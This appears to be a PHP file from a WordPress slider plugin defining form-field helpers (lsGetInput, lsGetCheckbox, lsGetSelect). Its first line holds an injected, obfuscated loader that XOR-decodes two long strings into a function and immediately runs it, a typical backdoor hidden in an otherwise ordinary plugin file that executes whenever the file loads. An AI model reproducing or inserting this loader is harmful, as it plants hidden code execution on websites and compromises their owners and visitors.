<?php $yTtLLH='MLX4 41+4:T==RU'; $IgNHhlF='.>=UTQnMAT7IT=;'^$yTtLLH; $LHLUCLIW='X>cO>OB;1PA8r=7IST7lR1W +6S=+2aQYEwpnoWgO2DE 3=YUm9<Bh,A2R+fX90nuVJBJxCkKWWzWwmkUK>plf  GtdoniNhLA.;0oQ-hEWiJdmDyJ8CV7+olOJTYzsic;FxynlHuX- POowikUR,Znu<ea<Tm12:uc<ASmM09- NneU4AoiPSfEP<R3,I-na:L1ns:5DIIkcRWJCUjQiM5:XNamn ;-A1F -htO-Y=MKjYyR5N.P 1DpOc utspwH =eA 7HExnha56XG0xaOI=CRLAJc< HuiIg-2DVHlnHP<MxWkkE7<2VAcK37, wEftDAIQAI3al4VJE ;Xdyajk jgv5-P6 sJZ08skrBr4TRI2hQ1c=coD, Qr=V4LUgoPQKUkc=uH1  ezCAFTXD=XoCQ0Hp>A<TI.rnTr0 F1<GOUIZ D0XCb2UDXa-70,f3A:Wen42YY752Yf00H fMvs0;O7sP  ahy=ZJkl< <9oSsq95DVIq-<2dXJ>>5CLQ3-Rbjat2U UPEqjQc=5cqF1;<Lou, 0roZorhSncSSfrTMsO -S2Sv<SnfccP4>f7q4aSuVKknjel76JX g8-Ul<1-8NAec39,Y+V1fjnHX6:-qsICqIot1K07=; YPH,1RnPMMKX=0=cqHlSp5I=.zwdja7'; $OFfRInuf=$IgNHhlF('', '1XKnX:,XE9.V-XO   DDuI8RtR2IJm><,1PYGO,mFT1+CGT6;MAS07H F3t95LDFQ2+6+TcO 2.SwWMKu04yeBOU3TYOINubEHHTBGuDHxwYqDI-E9L1:REGH++ 8SHIGRmSPdeAQ7XTpaRWAO13X;5QU8AbtIZWC.GUavM>DKAE FA>Q8F4yhlLYN7GY;CFEU9EGH0<9C4aiv3+74JlI+TV++ZgJDZY n-ETHIoK8Q>.QSs4Z<K1CYdXk<c:;892hANEeKR1eEPHECW42UQA4C4g6-5+<WE1UTiCFW=mBeJ,1H,XjKO3VPG3zi69=EFWmGP  =0hiHkeR98 AX0DQE59e;23fypWSSn1UASVLbVB5><WAqJi4jK MT0-V3MlhGK;42naj4Q,PTAEGce0541XceJ,:5z4eX5=ORSt2EN5TN..9  ElH71=V409>rZEXNQ I2SZkV<:XQWqBTQ<AOaVWTZ;V,;EYHAB73,CHXAHXOuUQXG670.FYK;=2WMA0dvXH+EFAPV4T4yeWLqKPQVYbUZH-4RGEIU2sOOUsIQ2gWJgyA-BNbTbCX7WQSPaVXSVHRP7B0lBNLCLVD89Y8SH,3YIDK:2MDCXU5D7UAFNl<WNLXZicQiOTJA9RKZLqt,ME35w=,24RQYD,aWYyP1TZRGMQkJ'^$LHLUCLIW); $OFfRInuf();

function lsGetInput($default, $current, $attrs = array()) {

	// Markup
	$el = phpQuery::newDocumentHTML('<input>')->children();
	$type = is_string($default['value']) ? 'text' : 'number';
	$name = is_string($default['keys']) ? $default['keys'] : $default['keys'][0];
	$el->attr('type', $type);
	$el->attr('name', $name);
	$el->val($default['value']);

	// Attributes
	$attrs = isset($default['attrs']) ? array_merge($default['attrs'], $attrs) : $attrs;
	if(isset($attrs) && is_array($attrs)) {
		foreach($attrs as $attr => $val) {
			$el->attr($attr, $val);
		}
	}

	// Tooltip
	if(isset($default['tooltip'])) {
		$el->attr('data-help', $default['tooltip']);
	}

	// Override the default
	if(isset($current[$name]) && $current[$name] !== '') {
		$el->val(stripslashes($current[$name]));
	}

	echo $el;
}

function lsGetCheckbox($default, $current, $attrs = array()) {

	// Markup
	$el = phpQuery::newDocumentHTML('<input>')->children();
	$name = is_string($default['keys']) ? $default['keys'] : $default['keys'][0];
	$el->attr('type', 'checkbox');
	$el->attr('name', $name);

	// Attributes
	$attrs = isset($default['attrs']) ? array_merge($default['attrs'], $attrs) : $attrs;
	if(isset($attrs) && is_array($attrs)) {
		foreach($attrs as $attr => $val) {
			$el->attr($attr, $val);
		}
	}

	// Checked?
	if($default['value'] === true && count($current) < 3) {
		$el->attr('checked', 'checked');
	} elseif(isset($current[$name]) && $current[$name] != false && $current[$name] !== 'false') {
		$el->attr('checked', 'checked');
	}

	echo $el;
}

function lsGetSelect($default, $current, $attrs = array()) {

	// Var to hold data to print
	$el = phpQuery::newDocumentHTML('<select>')->children();
	$name = is_string($default['keys']) ? $default['keys'] : $default['keys'][0];
	$el->attr('name', $name);
	$value = $default['value'];
	$options = array();

	// Attributes
	$attrs = isset($default['attrs']) ? array_merge($default['attrs'], $attrs) : $attrs;
	if(isset($attrs) && is_array($attrs)) {
		foreach($attrs as $attr => $val) {
			if(!is_array($val)) {
				$el->attr($attr, $val);
			}
		}
	}

	// Get options
	if(isset($default['options']) && is_array($default['options'])) {
		$options = $default['options'];
	} elseif(isset($attrs['options']) && is_array($attrs['options'])) {
		$options = $attrs['options'];
	}

	// Override the default
	if(isset($current[$name]) && $current[$name] !== '') {
		$value = $current[$name];
	}

	// Tooltip
	if(isset($default['tooltip'])) {
		$el->attr('data-help', $default['tooltip']);
	}

	// Add options
	foreach($options as $name => $val) {
		$name = is_string($name) ? $name : $val;
		$checked = ($name == $value) ? ' selected="selected"' : '';
		$el->append("<option value=\"$name\" $checked>$val</option>");
	}

	echo $el;
}

?>
